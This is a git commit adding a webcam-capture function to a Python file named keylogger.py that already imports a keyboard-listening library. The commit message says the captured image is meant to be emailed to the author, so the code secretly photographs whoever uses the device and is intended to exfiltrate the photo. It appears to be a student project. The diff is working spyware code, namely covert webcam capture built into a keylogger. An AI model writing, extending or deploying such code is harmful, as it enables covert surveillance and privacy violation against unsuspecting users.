79bfa22a5c1a0c68866b43d33cec74b9af44e35e
Jayden Sleeuwenhoek <sleeuwenhj@coventry.ac.uk>
2023-07-11 16:16:51 +0100

    created a function that takes images using the devices webcam and saves them to a file (this will be used to email me an image of the user)

--- keylogger.py
+++ keylogger.py
@@ -1,2 +1,18 @@
 from pynput import keyboard
+import time
+import cv2
+
+
+# Function to take an image from the webcam
+def webcam_image():
+    # Gains access to the webcam
+    webcam_port = 0
+    webcam = cv2.VideoCapture(webcam_port)
+    # Waits 0.1 seconds to stop the image being a black screen
+    time.sleep(0.1)
+    # Saves image to a variable
+    return_value, image = webcam.read()
+    cv2.imwrite("webcam.png", image)
+    # Deletes the variable so that webcam becomes unlocked (cleans up after itself)
+    del webcam
 
